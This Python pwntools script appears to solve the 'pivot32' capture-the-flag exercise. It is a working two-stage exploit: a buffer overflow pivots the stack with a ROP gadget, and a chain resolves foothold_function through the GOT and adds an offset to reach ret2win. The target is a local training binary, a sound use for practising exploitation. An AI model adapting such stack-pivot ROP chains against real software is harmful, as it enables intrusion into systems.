from pwn import *
from time import sleep

"""
Task:

Gadget:
    0x0804882c : pop eax ; ret
    0x0804882e : xchg eax, esp ; ret
    0x08048830 : mov eax, dword ptr [eax] ; ret
    0x080484a9 : pop ebx ; ret
    0x08048833 : add eax, ebx ; ret
    0x080485f0 : call eax


Stack: 

"""
def w8(t=.5):
    sleep(t)

def exploit():
    p = process("pivot32")
    e = ELF('pivot32')
    lib = ELF('libpivot32.so')

    foothold_addr = e.plt['foothold_function']
    foothold_got = e.got['foothold_function']
    print(f"foothold_function: {hex(foothold_addr)}")

    proc.wait_for_debugger(p.pid)

    p.recvuntil("pivot: ")
    addr = int(p.recvline()[:-1], 16)
    print(f"pivot addr: {hex(addr)}")

    puts_plt = e.plt['puts']
    main_addr = 0x08048686

    pop_eax = 0x0804882c
    pop_ebx = 0x080484a9
    xchg_eax_esp = 0x0804882e
    mov_eax_ptr_eax = 0x08048830
    add_eax_ebx = 0x08048833
    call_eax = 0x080485f0


    # 2nd Stage: Exploitation
    """
    EAX: 0xf7fa577d (<foothold_function>:   push   ebp)
        foothold_function => 0xf7fa577d
        ret2win => 0xf7fa5974
        ret2win = foothold_function + 503
    >>> 0xf7fa5974-0xf7fa577d
        503
    """
    buf = p32(foothold_addr)    # make plt add address to plt.got
    buf += p32(pop_eax)         # pop foothold
    buf += p32(foothold_got)
    buf += p32(mov_eax_ptr_eax) # now foothold@libpivot in eax
    buf += p32(pop_ebx)         # ret2win = foothold_function + 503
    buf += p32(503)
    buf += p32(add_eax_ebx)     # eax = ret2win
    buf += p32(call_eax)




    p.recvuntil("Send a ROP chain now and it will land there")
    p.sendline(buf)
    # w8()
    
    # 1st Stage: Pivot Stage
    buf = b""
    buf += b"A"*0x2c
    buf += p32(pop_eax)
    buf += p32(addr)
    buf += p32(xchg_eax_esp)
    p.recvuntil("Now please send your stack smash")
    p.sendline(buf)

    p.interactive()
exploit()